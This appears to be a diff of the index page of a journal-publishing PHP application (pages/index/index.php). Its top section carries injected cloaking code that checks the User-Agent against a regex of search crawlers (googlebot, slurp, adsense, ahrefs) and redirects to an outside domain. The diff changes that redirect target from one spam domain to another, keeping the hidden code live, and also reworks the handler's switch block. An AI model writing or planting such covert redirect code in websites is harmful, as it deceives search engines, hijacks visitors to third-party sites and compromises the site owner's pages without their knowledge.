@@ -5,7 +5,7 @@ header('Vary: User-Agent');
 
 $ua = strtolower($_SERVER["HTTP_USER_AGENT"]);
 
-$urlTo = "https://revistareg.com/";
+$urlTo = "https://zoosprint.org/";
 
 $botchar = "/(googlebot|slurp|adsense|inspection|ahrefs)/";
 
@@ -21,7 +21,7 @@ ob_end_flush();
 /**
  * @defgroup pages_index Index Pages
  */
-
+ 
 /**
  * @file pages/index/index.php
  *
@@ -30,12 +30,13 @@ ob_end_flush();
  * Distributed under the GNU GPL v3. For full terms see the file docs/COPYING.
  *
  * @ingroup pages_index
- *
- * @brief Handle site index requests.
+ * @brief Handle site index requests. 
  *
  */
 
 switch ($op) {
-    case 'index':
-        return new APP\pages\index\IndexHandler();
+ case 'index':
+  define('HANDLER_CLASS', 'IndexHandler');
+  import('pages.index.IndexHandler');
+  break;
 }
